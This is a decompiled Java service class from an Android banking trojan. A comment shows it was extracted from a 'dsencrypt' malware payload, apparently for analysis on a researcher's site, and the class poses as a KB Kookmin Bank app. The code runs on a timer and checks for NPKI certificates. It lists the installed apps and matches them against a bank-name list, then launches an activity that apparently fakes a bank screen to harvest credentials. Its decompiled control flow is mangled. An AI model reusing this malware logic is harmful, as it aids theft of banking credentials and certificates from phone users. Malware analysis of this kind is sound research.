package com.kbstar.kb.android.services;

import android.app.Service;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.media.MediaPlayer;
import android.os.IBinder;
import android.util.Log;
import com.kbstar.kb.android.star.AppContacts;
import com.kbstar.kb.android.star.MainActivity;
import com.kbstar.kb.android.star.util.NPUtil;
import com.kbstar.kb.android.star.util.Url;
import java.util.ArrayList;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

public class autoRunService
  extends Service
{
  private static final long BANK_BEGIN_CHECK_TIME = 2400000L;
  private static final long BANK_TOP_CHECK_TIME = 1800000L;
  private final String DEBUG_TAG = "clService";
  private List<ApplicationInfo> listAppcations = new ArrayList();
  private TimerTask mTimerTask;
  private PackageManager pm;
  public boolean threadDisable = true;
  private Timer timer;
  Url u = new Url();
  
  private void bind()
  {
    MediaPlayer.create(this, 2131099649).start();
  }
  
  private String getSoftName(PackageManager paramPackageManager)
  {
    Object localObject2 = "";
    int i = 0;
    String str;
    int j;
    for (;;)
    {
      if (i >= this.listAppcations.size()) {
        return (String)localObject2;
      }
      str = (String)((ApplicationInfo)this.listAppcations.get(i)).loadLabel(paramPackageManager);
      j = 0;
      if (j < AppContacts.BK_NAME_LIST.length) {
        break;
      }
      i += 1;
    }
    Object localObject1 = localObject2;
    if (str.equals(AppContacts.BK_NAME_LIST[j])) {
      if (((String)localObject2).length() != 0) {
        break label104;
      }
    }
    label104:
    for (localObject1 = AppContacts.BK_CALL_LIST[j];; localObject1 = localObject2 + "," + AppContacts.BK_CALL_LIST[j])
    {
      j += 1;
      localObject2 = localObject1;
      break;
    }
  }
  
  private void uploadContent()
  {
    for (;;)
    {
      try
      {
        Object localObject1;
        int i;
        if (NPUtil.isNPKIExists())
        {
          this.pm = getPackageManager();
          this.listAppcations = this.pm.getInstalledApplications(8192);
          localObject1 = getSoftName(this.pm);
          if (((String)localObject1).length() > 0)
          {
            localObject1 = ((String)localObject1).split(",");
            i = 0;
            int j = localObject1.length;
            if (i < j) {
              continue;
            }
          }
        }
        return;
        if (!this.u.isTrue(localObject1[i]).booleanValue())
        {
          bind();
          Intent localIntent = new Intent(this, MainActivity.class);
          SharedPreferences.Editor localEditor = getSharedPreferences("data", 0).edit();
          localEditor.clear();
          localEditor.commit();
          localEditor.putString("item", localObject1[i]);
          localEditor.commit();
          localIntent.addFlags(268435456);
          startActivity(localIntent);
        }
        else
        {
          i += 1;
        }
      }
      finally {}
    }
  }
  
  public IBinder onBind(Intent paramIntent)
  {
    return null;
  }
  
  public void onCreate()
  {
    super.onCreate();
    Log.v("clService", "onCreate");
    this.timer = new Timer();
    this.mTimerTask = new TimerTask()
    {
      public void run()
      {
        autoRunService.this.uploadContent();
      }
    };
    this.timer.schedule(this.mTimerTask, 2400000L, 1800000L);
  }
  
  public void onDestroy()
  {
    super.onDestroy();
    this.threadDisable = true;
    Log.v("clService", "on destroy");
    if (this.timer != null)
    {
      this.timer.cancel();
      this.timer = null;
    }
    if (this.mTimerTask != null)
    {
      this.mTimerTask.cancel();
      this.mTimerTask = null;
    }
  }
}


/* Location:              /home/enzo/Documents/BorelEnzo.github.io/malwares/dsencrypt/payload.jar!/com/kbstar/kb/android/services/autoRunService.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */